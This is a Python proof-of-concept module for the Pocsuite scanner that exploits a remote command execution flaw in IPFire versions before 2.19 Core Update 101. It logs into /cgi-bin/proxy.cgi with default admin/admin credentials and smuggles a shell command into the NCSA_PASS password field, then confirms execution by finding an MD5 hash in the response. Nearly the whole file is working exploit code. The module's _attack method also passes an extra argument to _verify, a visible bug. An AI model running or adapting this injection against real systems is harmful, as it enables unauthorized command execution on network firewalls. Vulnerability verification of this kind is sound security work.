#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import random
import hashlib
import string

class TestPOC(POCBase):
    name = "IPFire Proxy RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'Code excution'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/39765/'
    desc = 'Module exploits IPFire < 2.19 Core Update 101 Remote Code Execution vulnerability which allows executing command on operating system level.'


    vulDate = ''
    createDate = '2017-10-18'
    updateDate = '2017-10-18'

    appName = 'IPFire'
    appVersion = 'IPFire < 2.19'
    dork = ''
    appPowerLink = 'http://www.ipfire.org'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        a = ''.join(random.sample(string.ascii_letters + string.digits, 12))
        md5 = hashlib.md5()
        md5.update(a)
        md5hash = md5.hexdigest()
        url = self.url + '/cgi-bin/proxy.cgi'
        username = 'admin'
        password = 'admin'
        headers = {'Content-Type': 'application/x-www-form-urlencoded',
                   'Referer': url}
        payload = "echo -n {}|md5sum".format(a)

        data = {"NCSA_USERNAME": a,
                "NCSA_GROUP": "standard",
                "NCSA_PASS": payload,
                "NCSA_PASS_CONFIRM": payload,
                "SUBMIT": "Create+user",
                "ACTION": "Add",
                "NCSA_MIN_PASS_LEN": "6"}

        resp = req.post(url, headers=headers, data=data,auth=(username,password), timeout=10)
        if md5hash in resp.content and '<!DOCTYPE html>' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
